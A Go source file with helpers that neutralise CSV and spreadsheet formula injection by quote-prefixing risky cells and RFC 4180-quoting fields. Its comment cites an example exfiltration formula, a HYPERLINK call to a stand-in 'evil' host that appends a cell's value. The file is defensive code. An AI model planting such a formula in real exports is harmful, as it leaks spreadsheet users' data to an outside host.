package csv

import "strings"

// SafeCell neutralises spreadsheet formula injection (CSV/DDE injection,
// audit F-13): a cell starting with = + - @ tab or carriage return is
// prefixed with a single quote so Excel, Sheets and LibreOffice treat it as
// text instead of evaluating it (e.g. =HYPERLINK("http://evil/?"&A2)).
func SafeCell(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// SafeRow applies SafeCell to every cell of a row (returns a new slice).
func SafeRow(row []string) []string {
	out := make([]string, len(row))
	for i, v := range row {
		out[i] = SafeCell(v)
	}
	return out
}

// Field returns s as one formula-safe, RFC 4180-quoted CSV field, for code
// that builds CSV text by hand.
func Field(s string) string {
	s = SafeCell(s)
	if strings.ContainsAny(s, ",\"\r\n") {
		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
	}
	return s
}
